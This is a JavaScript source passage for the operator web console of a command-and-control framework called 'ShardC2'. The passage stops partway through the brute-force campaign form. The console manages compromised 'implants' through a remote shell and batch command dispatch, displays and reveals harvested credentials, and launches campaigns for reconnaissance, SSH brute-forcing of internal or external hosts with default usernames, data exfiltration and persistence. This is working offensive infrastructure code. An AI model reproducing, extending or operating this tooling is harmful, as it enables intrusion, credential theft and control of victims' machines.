class API {
  constructor(token) {
    this.token = token;
    this.base = '/api/v1';
  }

  async request(method, path, body) {
    const opts = {
      method,
      headers: {
        'Authorization': `Bearer ${this.token}`,
        'Content-Type': 'application/json',
      },
    };
    if (body) opts.body = JSON.stringify(body);
    const resp = await fetch(this.base + path, opts);
    if (resp.status === 401 || resp.status === 403) {
      app.logout();
      throw new Error('Authentication failed');
    }
    if (resp.status === 429) {
      const retryAfter = parseInt(resp.headers.get('Retry-After') || '3', 10);
      await new Promise(r => setTimeout(r, retryAfter * 1000));
      return this.request(method, path, body);
    }
    return resp;
  }

  async get(path) { return (await this.request('GET', path)).json(); }
  async post(path, body) { return (await this.request('POST', path, body)).json(); }
  async put(path, body) { return (await this.request('PUT', path, body)).json(); }
  async del(path) { return (await this.request('DELETE', path)).json(); }
}

class App {
  constructor() {
    this.api = null;
    this.currentPage = 'dashboard';
    this.refreshTimer = null;
    this.bots = [];
    this.selectedBotId = null;
    this.cmdHistory = [];
    this.historyIndex = -1;
    this.terminalLines = [];
    this.activeCampaignId = null;
    this.campaignTab = 'overview';
    this.ws = null;
    this.wsConnected = false;
    this.multiMode = false;
    this.fileBrowserPath = '/';
    this.fileBrowserBotId = null;

    document.getElementById('login-pass').addEventListener('keydown', (e) => {
      if (e.key === 'Enter') this.login();
    });

    document.querySelectorAll('.nav-link').forEach(link => {
      link.addEventListener('click', (e) => {
        e.preventDefault();
        this.navigate(link.dataset.page);
      });
    });

    const saved = sessionStorage.getItem('shardc2_token');
    if (saved) {
      this.api = new API(saved);
      this.role = sessionStorage.getItem('shardc2_role') || 'viewer';
      this.username = sessionStorage.getItem('shardc2_username') || '';
      this.showApp();
    }
  }

  async login() {
    const user = document.getElementById('login-user').value.trim();
    const pass = document.getElementById('login-pass').value.trim();
    if (!user || !pass) return;

    const errorEl = document.getElementById('login-error');
    const btn = document.getElementById('login-btn');
    btn.querySelector('.btn-inner').textContent = 'CONNECTING...';

    try {
      const resp = await fetch('/api/v1/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: user, password: pass }),
      });
      const data = await resp.json();
      if (!resp.ok || !data.token) throw new Error(data.error || 'login failed');
      this.api = new API(data.token);
      sessionStorage.setItem('shardc2_token', data.token);
      sessionStorage.setItem('shardc2_role', data.role || 'viewer');
      sessionStorage.setItem('shardc2_username', data.username || user);
      this.role = data.role || 'viewer';
      this.username = data.username || user;
      errorEl.textContent = '';
      this.showApp();
    } catch (e) {
      errorEl.textContent = `[ ERROR ] ${e.message}`;
      btn.querySelector('.btn-inner').textContent = 'AUTHENTICATE';
    }
  }

  canEdit() { return this.role === 'admin' || this.role === 'operator'; }
  isAdmin() { return this.role === 'admin'; }

  logout() {
    sessionStorage.removeItem('shardc2_token');
    sessionStorage.removeItem('shardc2_role');
    sessionStorage.removeItem('shardc2_username');
    this.role = null;
    this.username = null;
    this.api = null;
    this.disconnectWS();
    clearInterval(this.refreshTimer);
    document.getElementById('app').classList.add('hidden');
    document.getElementById('login-screen').style.display = 'flex';
    document.getElementById('login-user').value = '';
    document.getElementById('login-pass').value = '';
    document.getElementById('login-btn').querySelector('.btn-inner').textContent = 'AUTHENTICATE';
  }

  showApp() {
    document.getElementById('login-screen').style.display = 'none';
    document.getElementById('app').classList.remove('hidden');
    const connEl = document.getElementById('conn-status');
    if (connEl && this.username) {
      connEl.innerHTML = `<span class="pulse-dot"></span><span>${this.username.toUpperCase()} [${this.role.toUpperCase()}]</span>`;
    }
    const settingsLink = document.querySelector('[data-page="settings"]');
    if (settingsLink) settingsLink.style.display = this.isAdmin() ? '' : 'none';
    this.connectWS();
    this.loadSafetyBanner();
    this.navigate('dashboard');
  }

  async loadSafetyBanner() {
    try {
      const data = await this.api.get('/safety/status');
      let banner = document.getElementById('safety-banner');
      if (!banner) {
        banner = document.createElement('div');
        banner.id = 'safety-banner';
        const sidebar = document.getElementById('sidebar');
        const footer = sidebar.querySelector('.sidebar-footer');
        sidebar.insertBefore(banner, footer);
      }
      const blocked = (data.blocked_features || []).map(f => f.replace(/_/g, ' ')).join(', ') || 'none';
      const mode = data.safe_mode ? 'SAFE' : 'LIVE';
      const color = data.safe_mode ? 'var(--green)' : 'var(--red-bright)';
      banner.style.cssText = `padding:0.6rem 1rem;font-size:0.6rem;letter-spacing:0.08em;border-top:1px solid var(--border);margin-top:auto;`;
      banner.innerHTML = `
        <div style="color:${color};font-weight:bold;margin-bottom:0.3rem">${mode} MODE</div>
        <div style="color:var(--text-muted);line-height:1.5">
          <div>Campaigns: ${data.running_campaigns || 0}</div>
          <div>Blocked: ${blocked}</div>
        </div>`;
    } catch (e) { /* ignore if endpoint unavailable */ }
  }

  connectWS() {
    const token = sessionStorage.getItem('shardc2_token');
    if (!token) return;
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const url = `${proto}//${location.host}/api/v1/ws/terminal?token=${encodeURIComponent(token)}`;
    try {
      this.ws = new WebSocket(url);
      this.ws.onopen = () => {
        this.wsConnected = true;
        this.updateConnStatus(true);
        if (this.selectedBotId) {
          this.ws.send(JSON.stringify({ action: 'subscribe', bot_id: this.selectedBotId }));
        }
      };
      this.ws.onmessage = (e) => this.handleWSMessage(e);
      this.ws.onclose = () => {
        this.wsConnected = false;
        this.updateConnStatus(false);
        setTimeout(() => { if (this.api) this.connectWS(); }, 5000);
      };
      this.ws.onerror = () => {};
    } catch (e) {}
  }

  disconnectWS() {
    if (this.ws) {
      this.ws.onclose = null;
      this.ws.close();
      this.ws = null;
    }
    this.wsConnected = false;
  }

  updateConnStatus(connected) {
    const el = document.getElementById('conn-status');
    if (!el) return;
    const userTag = this.username ? `${this.username.toUpperCase()} [${(this.role||'').toUpperCase()}]` : '';
    if (connected) {
      el.innerHTML = `<span class="pulse-dot"></span><span>${userTag || 'WS LIVE'}</span>`;
    } else {
      el.innerHTML = `<span class="pulse-dot" style="background:var(--yellow);box-shadow:0 0 8px var(--yellow)"></span><span>${userTag ? userTag + ' // POLLING' : 'POLLING'}</span>`;
    }
  }

  handleWSMessage(e) {
    try {
      const msg = JSON.parse(e.data);
      if (msg.type === 'result' && this.currentPage === 'terminal') {
        if (this.multiMode && this.pollMultiBots) {
          this.loadMultiHistory();
        } else {
          this.loadHistory();
        }
      }
    } catch (err) {}
  }

  wsSubscribe(botID) {
    if (this.ws && this.wsConnected) {
      this.ws.send(JSON.stringify({ action: 'subscribe', bot_id: botID }));
    }
  }

  wsUnsubscribe(botID) {
    if (this.ws && this.wsConnected) {
      this.ws.send(JSON.stringify({ action: 'unsubscribe', bot_id: botID }));
    }
  }

  navigate(page) {
    this.currentPage = page;
    clearInterval(this.refreshTimer);
    if (page !== 'campaigns') this.activeCampaignId = null;

    document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
    document.querySelector(`[data-page="${page}"]`)?.classList.add('active');

    const renders = {
      dashboard: () => this.renderDashboard(),
      bots: () => this.renderBots(),
      terminal: () => this.renderTerminal(),
      credentials: () => this.renderCredentials(),
      campaigns: () => this.renderCampaigns(),
      files: () => this.renderFileBrowser(),
      settings: () => this.renderSettings(),
    };

    if (renders[page]) renders[page]();
  }

  // ===== DASHBOARD =====
  async renderDashboard() {
    const c = document.getElementById('content');
    c.innerHTML = `
      <div class="page-header">
        <h1 class="page-title">OVERVIEW</h1>
        <span class="page-tag">REAL-TIME</span>
      </div>
      <div class="stats-grid" id="stats-grid"></div>
      <div class="section-header">
        <span class="section-title">ACTIVE IMPLANTS</span>
        <span class="refresh-hint">AUTO-REFRESH // 10s</span>
      </div>
      <div id="dash-bots"></div>`;
    await this.refreshDashboard();
    this.refreshTimer = setInterval(() => this.refreshDashboard(), 10000);
  }

  async refreshDashboard() {
    try {
      const [stats, botsData] = await Promise.all([
        this.api.get('/stats'),
        this.api.get('/bots/'),
      ]);
      this.bots = botsData.bots || [];

      const statsEl = document.getElementById('stats-grid');
      if (!statsEl) return;
      statsEl.innerHTML = `
        <div class="stat-card"><div class="stat-label">Total Implants</div><div class="stat-value red">${stats.total_bots}</div></div>
        <div class="stat-card"><div class="stat-label">Active</div><div class="stat-value green">${stats.active_bots}</div></div>
        <div class="stat-card"><div class="stat-label">Pending Cmds</div><div class="stat-value yellow">${stats.pending_commands}</div></div>
        <div class="stat-card"><div class="stat-label">Campaigns</div><div class="stat-value crimson">${stats.active_campaigns}/${stats.total_campaigns}</div></div>`;

      const el = document.getElementById('dash-bots');
      if (!el) return;
      if (this.bots.length === 0) {
        el.innerHTML = '<div class="empty-state"><div class="icon">&#9654;</div><p>NO IMPLANTS REGISTERED</p></div>';
        return;
      }

      el.innerHTML = `<div class="table-wrap"><table>
        <thead><tr><th>ID</th><th>Host</th><th>Internal IP</th><th>Platform</th><th>User</th><th>Status</th><th>Last Beacon</th></tr></thead>
        <tbody>${this.bots.map(b => `
          <tr class="clickable" onclick="app.openTerminalForBot('${b.id}')">
            <td style="color:var(--red)">${b.id.substring(0, 8)}</td>
            <td style="color:var(--text-bright)">${esc(b.hostname)}</td>
            <td>${esc(b.ip_address)}</td>
            <td><span class="os-tag">${osTag(b.os)}</span>${esc(b.architecture)}</td>
            <td>${esc(b.username)}${b.privileged ? ' <span class="priv-tag">ROOT</span>' : ''}</td>
            <td>${statusBadge(b)}</td>
            <td>${timeAgo(b.last_seen)}</td>
          </tr>`).join('')}</tbody></table></div>`;
    } catch (e) {
      console.error('Dashboard refresh failed:', e);
    }
  }

  // ===== BOTS =====
  async renderBots() {
    const c = document.getElementById('content');
    c.innerHTML = `
      <div class="page-header">
        <h1 class="page-title">IMPLANTS</h1>
        <span class="page-tag">ASSET MANAGEMENT</span>
      </div>
      <div id="bot-detail-panel"></div>
      <div class="section-header">
        <span class="section-title">REGISTERED IMPLANTS</span>
        <span class="refresh-hint">AUTO-REFRESH // 10s</span>
      </div>
      <div id="bots-table"></div>`;
    await this.refreshBots();
    this.refreshTimer = setInterval(() => this.refreshBots(), 10000);
  }

  async refreshBots() {
    const data = await this.api.get('/bots/');
    this.bots = data.bots || [];
    const el = document.getElementById('bots-table');
    if (!el) return;

    if (this.bots.length === 0) {
      el.innerHTML = '<div class="empty-state"><div class="icon">&#9654;</div><p>NO IMPLANTS REGISTERED</p></div>';
      return;
    }

    el.innerHTML = `<div class="table-wrap"><table>
      <thead><tr><th>ID</th><th>Hostname</th><th>Internal</th><th>External</th><th>Platform</th><th>User</th><th>Priv</th><th>Status</th><th>Last Beacon</th><th>Actions</th></tr></thead>
      <tbody>${this.bots.map(b => `
        <tr>
          <td style="color:var(--red)">${b.id.substring(0, 8)}</td>
          <td style="color:var(--text-bright)">${esc(b.hostname)}</td>
          <td>${esc(b.ip_address)}</td>
          <td>${esc(b.external_ip)}</td>
          <td><span class="os-tag">${osTag(b.os)}</span>${esc(b.architecture)}</td>
          <td>${esc(b.username)}</td>
          <td>${b.privileged ? '<span class="priv-tag">ROOT</span>' : '<span style="color:var(--text-muted)">NO</span>'}</td>
          <td>${statusBadge(b)}</td>
          <td>${timeAgo(b.last_seen)}</td>
          <td>
            ${this.canEdit() ? `<button class="btn-sm" onclick="app.openTerminalForBot('${b.id}')">SHELL</button>
            <button class="btn-sm btn-danger" onclick="app.removeBot('${b.id}')">KILL</button>` : '<span style="color:var(--text-muted)">-</span>'}
          </td>
        </tr>`).join('')}</tbody></table></div>`;

    if (this.selectedBotId) this.showBotDetail(this.selectedBotId);
  }

  async showBotDetail(id) {
    this.selectedBotId = id;
    const b = this.bots.find(b => b.id === id);
    if (!b) return;

    document.getElementById('bot-detail-panel').innerHTML = `
      <div class="bot-detail">
        <div class="bot-detail-header">
          <h3>${esc(b.hostname)} // ${b.id.substring(0, 8)}</h3>
          <button class="btn-sm" onclick="document.getElementById('bot-detail-panel').innerHTML=''">CLOSE</button>
        </div>
        <div class="bot-detail-grid">
          <div><div class="bot-field-label">Implant ID</div><div class="bot-field-value" style="color:var(--red)">${b.id}</div></div>
          <div><div class="bot-field-label">Internal IP</div><div class="bot-field-value">${esc(b.ip_address)}</div></div>
          <div><div class="bot-field-label">External IP</div><div class="bot-field-value">${esc(b.external_ip)}</div></div>
          <div><div class="bot-field-label">Platform</div><div class="bot-field-value">${esc(b.os)} / ${esc(b.architecture)}</div></div>
          <div><div class="bot-field-label">User</div><div class="bot-field-value">${esc(b.username)}</div></div>
          <div><div class="bot-field-label">Privilege</div><div class="bot-field-value">${b.privileged ? '<span class="priv-tag">ROOT ACCESS</span>' : 'Standard'}</div></div>
          <div><div class="bot-field-label">Status</div><div class="bot-field-value">${statusBadge(b)}</div></div>
          <div><div class="bot-field-label">Beacon Interval</div><div class="bot-field-value">${b.beacon_interval}s</div></div>
          <div><div class="bot-field-label">First Contact</div><div class="bot-field-value">${new Date(b.created_at).toLocaleString()}</div></div>
        </div>
      </div>`;
  }

  async removeBot(id) {
    if (!confirm(`Terminate implant ${id.substring(0, 8)}?`)) return;
    await this.api.del(`/bots/${id}`);
    this.selectedBotId = null;
    this.refreshBots();
  }

  openTerminalForBot(id) {
    this.selectedBotId = id;
    this.navigate('terminal');
  }

  // ===== TERMINAL =====
  async renderTerminal() {
    const c = document.getElementById('content');

    if (this.bots.length === 0) {
      const data = await this.api.get('/bots/');
      this.bots = data.bots || [];
    }

    const opts = this.bots.map(b =>
      `<option value="${b.id}" ${b.id === this.selectedBotId ? 'selected' : ''}>${esc(b.hostname)} [${b.id.substring(0, 8)}] ${esc(b.ip_address)}</option>`
    ).join('');

    const multiChips = this.bots.map(b =>
      `<div class="bot-chip ${this.multiMode ? 'multi-target' : ''}" data-botid="${b.id}" onclick="this.classList.toggle('selected')">${esc(b.hostname)} [${b.id.substring(0, 8)}]</div>`
    ).join('');

    c.innerHTML = `
      <div class="terminal-container">
        <div class="terminal-header">
          <div id="term-single-select" class="${this.multiMode ? 'hidden' : ''}">
            <select id="term-bot-select" onchange="app.selectTermBot(this.value)">
              <option value="">-- SELECT TARGET --</option>
              ${opts}
            </select>
          </div>
          <button class="btn-sm ${this.multiMode ? 'btn-multi-active' : ''}" onclick="app.toggleMultiMode()" id="multi-btn">MULTI</button>
          <button class="btn-sm" onclick="app.loadHistory()">RELOAD</button>
          <button class="btn-sm" onclick="app.clearTerminal()">CLEAR</button>
          <span class="ws-badge" id="ws-badge">${this.wsConnected ? 'WS' : 'POLL'}</span>
        </div>
        <div id="term-multi-picker" class="${this.multiMode ? '' : 'hidden'}">
          <div class="bot-picker">${multiChips}</div>
          <button class="btn-sm" style="margin-top:0.3rem" onclick="document.querySelectorAll('#term-multi-picker .bot-chip').forEach(c=>c.classList.add('selected'))">ALL</button>
        </div>
        <div class="terminal-output" id="term-output"><span class="cmd-system">[*] ShardC2 Remote Shell
[*] Select a target implant to begin.
[*] Command types: shell | download | upload | sleep | persist | kill
[*] MULTI mode: send commands to multiple implants at once</span></div>
        ${this.canEdit() ? `<div class="terminal-input-row">
          <span class="terminal-prompt">root@shard:~#</span>
          <input type="text" id="term-input" placeholder="enter command..." onkeydown="app.handleTerminalKey(event)" autocomplete="off" spellcheck="false">
          <select class="cmd-type-select" id="term-cmd-type">
            <option value="shell">SHELL</option>
            <option value="download">DOWNLOAD</option>
            <option value="upload">UPLOAD</option>
            <option value="sleep">SLEEP</option>
            <option value="persist">PERSIST</option>
            <option value="kill">KILL</option>
          </select>
        </div>` : `<div style="padding:0.8rem 1rem;color:var(--yellow);font-size:0.75rem;letter-spacing:0.1em;border-top:1px solid var(--border)">VIEWER MODE — READ ONLY</div>`}
      </div>`;

    const termInput = document.getElementById('term-input');
    if (termInput) termInput.focus();
    if (this.selectedBotId && !this.multiMode) this.loadHistory();
  }

  selectTermBot(botId) {
    if (this.selectedBotId) this.wsUnsubscribe(this.selectedBotId);
    this.selectedBotId = botId;
    if (botId) {
      this.wsSubscribe(botId);
      this.loadHistory();
    }
  }

  toggleMultiMode() {
    this.multiMode = !this.multiMode;
    this.renderTerminal();
  }

  async loadHistory() {
    if (!this.selectedBotId) return;
    const output = document.getElementById('term-output');

    try {
      const data = await this.api.get(`/commands/history/${this.selectedBotId}`);
      const cmds = (data.commands || []).reverse();

      this.terminalLines = [];

      const bot = this.bots.find(b => b.id === this.selectedBotId);
      if (bot) {
        this.terminalLines.push(`<span class="cmd-system">[*] Connected to ${esc(bot.hostname)} (${esc(bot.ip_address)})
[*] Platform: ${esc(bot.os)}/${esc(bot.architecture)} | User: ${esc(bot.username)} | Priv: ${bot.privileged ? 'ROOT' : 'standard'}</span>`);
      }

      cmds.forEach(cmd => {
        this.terminalLines.push(`\n<span class="cmd-system">[${cmd.type.toUpperCase()}]</span> <span class="cmd-input">${esc(cmd.payload)}</span>`);
        if (cmd.output) {
          const cls = cmd.status === 'failed' ? 'cmd-error' : 'cmd-output';
          this.terminalLines.push(`<span class="${cls}">${esc(cmd.output)}</span>`);
        }
        if (cmd.status === 'pending' || cmd.status === 'executing') {
          this.terminalLines.push(`<span class="cmd-system">[${cmd.status.toUpperCase()}...]</span>`);
        }
      });

      output.innerHTML = this.terminalLines.join('\n') || '<span class="cmd-system">[*] No history. Start operating.</span>';
      output.scrollTop = output.scrollHeight;
    } catch (e) {
      output.innerHTML = `<span class="cmd-error">[!] Failed to load history: ${e.message}</span>`;
    }
  }

  async handleTerminalKey(e) {
    if (e.key === 'Enter') {
      const input = document.getElementById('term-input');
      const cmd = input.value.trim();
      if (!cmd) return;

      const cmdType = document.getElementById('term-cmd-type').value;
      const output = document.getElementById('term-output');

      this.cmdHistory.push(cmd);
      this.historyIndex = this.cmdHistory.length;
      input.value = '';

      if (this.multiMode) {
        const selectedBots = [...document.querySelectorAll('#term-multi-picker .bot-chip.selected')]
          .map(el => el.dataset.botid).filter(Boolean);
        if (selectedBots.length === 0) {
          this.terminalLines.push(`\n<span class="cmd-error">[!] No targets selected in MULTI mode</span>`);
          output.innerHTML = this.terminalLines.join('\n');
          output.scrollTop = output.scrollHeight;
          return;
        }

        const names = selectedBots.map(id => {
          const b = this.bots.find(b => b.id === id);
          return b ? b.hostname : id.substring(0, 8);
        }).join(', ');
        this.terminalLines.push(`\n<span class="cmd-system">[MULTI:${cmdType.toUpperCase()}] &raquo; ${esc(names)}</span> <span class="cmd-input">${esc(cmd)}</span>`);
        this.terminalLines.push(`<span class="cmd-system">[DISPATCHING TO ${selectedBots.length} TARGETS...]</span>`);
        output.innerHTML = this.terminalLines.join('\n');
        output.scrollTop = output.scrollHeight;

        try {
          const result = await this.api.post('/commands/batch', {
            bot_ids: selectedBots,
            type: cmdType,
            payload: cmd,
          });
          this.terminalLines.pop();
          const cmds = result.commands || [];
          this.terminalLines.push(`<span class="cmd-system">[DISPATCHED ${cmds.length} COMMANDS — awaiting results...]</span>`);
          output.innerHTML = this.terminalLines.join('\n');
          output.scrollTop = output.scrollHeight;

          selectedBots.forEach(id => this.wsSubscribe(id));
          this.pollMultiBots = selectedBots;
          this.pollCount = 0;
          setTimeout(() => this.pollMultiResults(), 2000);
        } catch (err) {
          this.terminalLines.pop();
          this.terminalLines.push(`<span class="cmd-error">[!] Batch send failed: ${err.message}</span>`);
          output.innerHTML = this.terminalLines.join('\n');
        }
        return;
      }

      if (!this.selectedBotId) return;

      this.terminalLines.push(`\n<span class="cmd-system">[${cmdType.toUpperCase()}]</span> <span class="cmd-input">${esc(cmd)}</span>`);
      this.terminalLines.push(`<span class="cmd-system">[PENDING...]</span>`);
      output.innerHTML = this.terminalLines.join('\n');
      output.scrollTop = output.scrollHeight;

      try {
        await this.api.post('/commands/', {
          bot_id: this.selectedBotId,
          type: cmdType,
          payload: cmd,
        });
        this.pollCount = 0;
        setTimeout(() => this.pollForResult(), 1000);
      } catch (err) {
        this.terminalLines.pop();
        this.terminalLines.push(`<span class="cmd-error">[!] Send failed: ${err.message}</span>`);
        output.innerHTML = this.terminalLines.join('\n');
      }
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (this.historyIndex > 0) {
        this.historyIndex--;
        document.getElementById('term-input').value = this.cmdHistory[this.historyIndex];
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (this.historyIndex < this.cmdHistory.length - 1) {
        this.historyIndex++;
        document.getElementById('term-input').value = this.cmdHistory[this.historyIndex];
      } else {
        this.historyIndex = this.cmdHistory.length;
        document.getElementById('term-input').value = '';
      }
    }
  }

  async pollMultiResults() {
    if (this.currentPage !== 'terminal' || !this.pollMultiBots) return;
    const output = document.getElementById('term-output');
    let allDone = true;
    this.terminalLines = [];

    for (const botId of this.pollMultiBots) {
      const bot = this.bots.find(b => b.id === botId);
      const label = bot ? `${bot.hostname} [${botId.substring(0, 8)}]` : botId.substring(0, 8);
      try {
        const data = await this.api.get(`/commands/history/${botId}`);
        const cmds = (data.commands || []).reverse();
        const latest = cmds[cmds.length - 1];
        if (latest) {
          if (latest.status === 'pending' || latest.status === 'executing') allDone = false;
          this.terminalLines.push(`\n<span class="cmd-system">[${esc(label)}]</span> <span class="cmd-input">${esc(latest.payload)}</span>`);
          if (latest.output) {
            const cls = latest.status === 'failed' ? 'cmd-error' : 'cmd-output';
            this.terminalLines.push(`<span class="${cls}">${esc(latest.output)}</span>`);
          } else {
            this.terminalLines.push(`<span class="cmd-system">[${latest.status.toUpperCase()}...]</span>`);
          }
        }
      } catch (e) {
        this.terminalLines.push(`\n<span class="cmd-error">[${esc(label)}] fetch failed</span>`);
      }
    }

    output.innerHTML = this.terminalLines.join('\n') || '<span class="cmd-system">[*] Awaiting results...</span>';
    output.scrollTop = output.scrollHeight;

    this.pollCount = (this.pollCount || 0) + 1;
    if (!allDone && this.pollCount < 30) {
      setTimeout(() => this.pollMultiResults(), 2000);
    }
  }

  async loadMultiHistory() {
    if (!this.pollMultiBots || this.pollMultiBots.length === 0) return;
    this.pollCount = 0;
    this.pollMultiResults();
  }

  async pollForResult() {
    if (!this.selectedBotId || this.currentPage !== 'terminal') return;

    const data = await this.api.get(`/commands/history/${this.selectedBotId}`);
    const cmds = (data.commands || []).reverse();
    const output = document.getElementById('term-output');

    const bot = this.bots.find(b => b.id === this.selectedBotId);
    this.terminalLines = [];

    if (bot) {
      this.terminalLines.push(`<span class="cmd-system">[*] Connected to ${esc(bot.hostname)} (${esc(bot.ip_address)})
[*] Platform: ${esc(bot.os)}/${esc(bot.architecture)} | User: ${esc(bot.username)} | Priv: ${bot.privileged ? 'ROOT' : 'standard'}</span>`);
    }

    cmds.forEach(cmd => {
      this.terminalLines.push(`\n<span class="cmd-system">[${cmd.type.toUpperCase()}]</span> <span class="cmd-input">${esc(cmd.payload)}</span>`);
      if (cmd.output) {
        const cls = cmd.status === 'failed' ? 'cmd-error' : 'cmd-output';
        this.terminalLines.push(`<span class="${cls}">${esc(cmd.output)}</span>`);
      }
      if (cmd.status === 'pending' || cmd.status === 'executing') {
        this.terminalLines.push(`<span class="cmd-system">[${cmd.status.toUpperCase()}...]</span>`);
      }
    });

    output.innerHTML = this.terminalLines.join('\n');
    output.scrollTop = output.scrollHeight;

    const lastCmd = cmds[cmds.length - 1];
    if (lastCmd && (lastCmd.status === 'pending' || lastCmd.status === 'executing')) {
      this.pollCount = (this.pollCount || 0) + 1;
      if (this.pollCount < 30) {
        setTimeout(() => this.pollForResult(), 2000);
      }
    }
  }

  clearTerminal() {
    this.terminalLines = [];
    const output = document.getElementById('term-output');
    output.innerHTML = '<span class="cmd-system">[*] Terminal cleared.\n[*] Ready for operations.</span>';
  }

  // ===== CREDENTIALS =====
  async renderCredentials() {
    const c = document.getElementById('content');
    c.innerHTML = `
      <div class="page-header">
        <h1 class="page-title">CREDENTIALS</h1>
        <span class="page-tag">HARVESTED</span>
      </div>
      <div class="actions-bar">
        <button class="btn-sm" onclick="app.refreshCredentials()">REFRESH</button>
      </div>
      <div id="creds-table"></div>`;
    await this.refreshCredentials();
  }

  async refreshCredentials() {
    const data = await this.api.get('/credentials/');
    const creds = data.credentials || [];
    const el = document.getElementById('creds-table');
    if (!el) return;

    if (creds.length === 0) {
      el.innerHTML = '<div class="empty-state"><div class="icon">&#9670;</div><p>NO CREDENTIALS HARVESTED</p></div>';
      return;
    }

    el.innerHTML = `<div class="table-wrap"><table>
      <thead><tr><th>Target</th><th>Port</th><th>Service</th><th>Username</th><th>Password</th><th>Valid</th><th>Source</th><th>Discovered</th><th>Actions</th></tr></thead>
      <tbody>${creds.map(c => `
        <tr>
          <td style="color:var(--text-bright)">${esc(c.target)}</td>
          <td>${c.port}</td>
          <td><span class="os-tag">${esc(c.service).toUpperCase()}</span></td>
          <td style="color:var(--red-bright)">${esc(c.username)}</td>
          <td style="color:var(--yellow)"><span class="masked-pw">${esc(c.password)}</span>${this.canEdit() ? ` <button class="btn-sm" onclick="app.revealCredential('${c.id}', this)">REVEAL</button>` : ''}</td>
          <td>${c.valid ? '<span class="badge badge-active">VALID</span>' : '<span class="badge badge-dead">INVALID</span>'}</td>
          <td>${c.bot_id ? c.bot_id.substring(0, 8) : '-'}</td>
          <td>${timeAgo(c.discovered_at)}</td>
          <td>${this.canEdit() ? `<button class="btn-sm btn-danger" onclick="app.deleteCredential('${c.id}')">DELETE</button>` : '<span style="color:var(--text-muted)">-</span>'}</td>
        </tr>`).join('')}</tbody></table></div>`;
  }

  async revealCredential(id, btn) {
    try {
      const data = await this.api.get(`/credentials/${id}/reveal`);
      const span = btn.previousElementSibling;
      if (span) span.textContent = data.password || '';
      btn.remove();
    } catch (e) {
      this.showToast('Failed to reveal credential', 'error');
    }
  }

  async deleteCredential(id) {
    await this.api.del(`/credentials/${id}`);
    this.refreshCredentials();
  }

  // ===== CAMPAIGNS =====
  async renderCampaigns() {
    const c = document.getElementById('content');

    if (this.bots.length === 0) {
      const data = await this.api.get('/bots/');
      this.bots = data.bots || [];
    }

    if (this.activeCampaignId) {
      await this.renderCampaignDetail(this.activeCampaignId);
      return;
    }

    c.innerHTML = `
      <div class="page-header">
        <h1 class="page-title">CAMPAIGNS</h1>
        <span class="page-tag">OPERATIONS</span>
      </div>
      <div class="camp-detail" id="camp-create-panel" style="${this.canEdit() ? '' : 'display:none'}">
        <div style="margin-bottom:1rem;color:var(--text-muted);font-size:0.7rem;letter-spacing:0.1em">NEW OPERATION</div>
        <div class="config-grid">
          <div class="form-group">
            <label>Operation Name</label>
            <input type="text" id="camp-name" placeholder="e.g. Internal Recon Phase 1">
          </div>
          <div class="form-group">
            <label>Campaign Type</label>
            <select id="camp-type" onchange="app.updateCampaignConfigForm()">
              <option value="recon">RECON - System Enumeration</option>
              <option value="brute">BRUTE - Lateral Movement</option>
              <option value="exfil">EXFIL - Data Exfiltration</option>
              <option value="persist">PERSIST - Persistence Install</option>
              <option value="custom">CUSTOM - Arbitrary Command</option>
            </select>
          </div>
          <div class="form-group config-full">
            <label>Description</label>
            <input type="text" id="camp-desc" placeholder="Mission brief / objective">
          </div>
        </div>
        <div id="camp-config-form"></div>
        <div style="margin-top:0.8rem;margin-bottom:0.6rem;color:var(--text-muted);font-size:0.65rem;letter-spacing:0.1em">ASSIGN IMPLANTS</div>
        <div class="bot-picker" id="camp-bot-picker">
          ${this.bots.map(b => `
            <div class="bot-chip" data-botid="${b.id}" onclick="this.classList.toggle('selected')">
              <span>${esc(b.hostname)} [${b.id.substring(0, 8)}]</span>
              <span style="color:var(--text-muted);font-size:0.65rem">${esc(b.ip_address)}</span>
            </div>`).join('')}
        </div>
        ${this.bots.length > 1 ? '<button class="btn-sm" style="margin-top:0.3rem" onclick="document.querySelectorAll(\'.bot-chip\').forEach(c=>c.classList.add(\'selected\'))">SELECT ALL</button>' : ''}
        <div style="margin-top:1rem;display:flex;gap:0.5rem">
          <button class="btn-accent" onclick="app.createAndLaunchCampaign()">CREATE & LAUNCH</button>
          <button class="btn-sm" onclick="app.createCampaign(false)">CREATE ONLY</button>
        </div>
      </div>
      <div class="section-header">
        <span class="section-title">OPERATIONS</span>
        <span class="refresh-hint">AUTO-REFRESH // 5s</span>
      </div>
      <div id="camps-table"></div>`;
    this.updateCampaignConfigForm();
    await this.refreshCampaigns();
    this.refreshTimer = setInterval(() => this.refreshCampaigns(), 5000);
  }

  updateCampaignConfigForm() {
    const type = document.getElementById('camp-type')?.value;
    const el = document.getElementById('camp-config-form');
    if (!el) return;

    const configs = {
      recon: `
        <div style="color:var(--text-muted);font-size:0.65rem;letter-spacing:0.1em;margin-bottom:0.5rem">RECON MODULES</div>
        <div class="bot-picker">
          ${['sysinfo','network','users','software','cloud','containers','sensitive_files','internal_network','privesc','secrets','lateral_targets','persistence_check','process_inspect'].map(m =>
            `<div class="bot-chip selected" data-module="${m}" onclick="this.classList.toggle('selected')">${m.replace(/_/g,' ').toUpperCase()}</div>`
          ).join('')}
        </div>`,
      brute: `
        <div class="config-grid">
          <div class="form-group config-full">
            <label>Attack Mode</label>
            <div class="bot-picker">
              <div class="bot-chip selected" data-mode="lateral" onclick="document.querySelectorAll('[data-mode]').forEach(c=>c.classList.remove('selected'));this.classList.add('selected')">LATERAL — Via compromised bots (internal targets)</div>
              <div class="bot-chip" data-mode="external" onclick="document.querySelectorAll('[data-mode]').forEach(c=>c.classList.remove('selected'));this.classList.add('selected')">EXTERNAL — Server-side SSH (global IPs)</div>
            </div>
          </div>
          <div class="form-group">
            <label>Targets (CIDRs/IPs/hostnames, comma-separated)</label>
            <input type="text" id="brute-targets" placeholder="e.g. 10.0.0.0/24, 203.0.113.50, target.example.com">
          </div>
          <div class="form-group">
            <label>Ports (comma-separated)</label>
            <input type="text" id="brute-ports" placeholder="22" value="22">
          </div>
          <div class="form-group">
            <label>Usernames (comma-separated)</label>
            <input type="text" id="brute-users" placeholder="root, admin, ubuntu" value="root, admin, ubuntu, ec2-user">
          </div>
          <div class="form-group">
            <label>Passwords (comma-separated)</label>
